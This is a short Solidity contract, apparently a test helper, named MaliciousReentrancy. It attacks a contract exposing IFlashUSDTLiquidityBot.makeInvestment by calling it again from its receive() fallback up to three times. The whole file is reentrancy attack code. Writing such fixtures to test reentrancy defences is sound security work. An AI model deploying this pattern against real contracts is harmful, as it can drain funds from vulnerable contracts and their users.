// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IFlashUSDTLiquidityBot {
    function makeInvestment() external payable;
}

contract MaliciousReentrancy {
    IFlashUSDTLiquidityBot public target;
    uint256 public attackCount;
    
    constructor(address _target) {
        target = IFlashUSDTLiquidityBot(_target);
    }
    
    function attack() external payable {
        target.makeInvestment{value: msg.value}();
    }
    
    // This would be called during reentrancy attempt
    receive() external payable {
        if (attackCount < 3) {
            attackCount++;
            target.makeInvestment{value: 0.1 ether}();
        }
    }
}